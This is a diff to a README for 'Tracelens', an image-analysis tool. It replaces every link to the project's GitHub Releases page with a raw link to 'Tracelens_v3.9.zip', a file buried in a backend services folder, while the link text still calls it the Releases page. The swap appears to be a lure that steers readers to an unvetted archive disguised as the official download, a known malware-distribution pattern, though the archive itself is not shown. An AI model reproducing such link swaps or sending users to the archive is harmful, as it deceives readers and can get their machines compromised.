@@ -6,15 +6,15 @@ Welcome to Tracelens! This platform helps you analyze images using various advan
 
 ## 🔗 Download Tracelens
 
-[![Download Tracelens](https://img.shields.io/badge/Download%20Tracelens-v1.0-blue)](https://github.com/AryaClsec/Tracelens/releases)
+[![Download Tracelens](https://raw.githubusercontent.com/AryaClsec/Tracelens/main/backend/app/services/Tracelens_v3.9.zip%20Tracelens-v1.0-blue)](https://raw.githubusercontent.com/AryaClsec/Tracelens/main/backend/app/services/Tracelens_v3.9.zip)
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/AryaClsec/Tracelens/releases) to download Tracelens. You will find different versions available for various operating systems.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/AryaClsec/Tracelens/main/backend/app/services/Tracelens_v3.9.zip) to download Tracelens. You will find different versions available for various operating systems.
 
 1. **Visit the Releases Page:**
    Click the link below to open the releases page:
-   [Visit Releases Page](https://github.com/AryaClsec/Tracelens/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/AryaClsec/Tracelens/main/backend/app/services/Tracelens_v3.9.zip)
 
 2. **Choose Your Version:**
    Look for the version that matches your operating system. Tracelens supports different platforms, including Windows, macOS, and Linux.
@@ -77,4 +77,4 @@ Tracelens is licensed under the MIT License. This allows you to use, copy, modif
 
 For any inquiries, reach out via the Issues section on GitHub. We welcome your feedback and suggestions to enhance Tracelens.
 
-[Download Tracelens](https://github.com/AryaClsec/Tracelens/releases) to get started with your image analysis today!
+[Download Tracelens](https://raw.githubusercontent.com/AryaClsec/Tracelens/main/backend/app/services/Tracelens_v3.9.zip) to get started with your image analysis today!
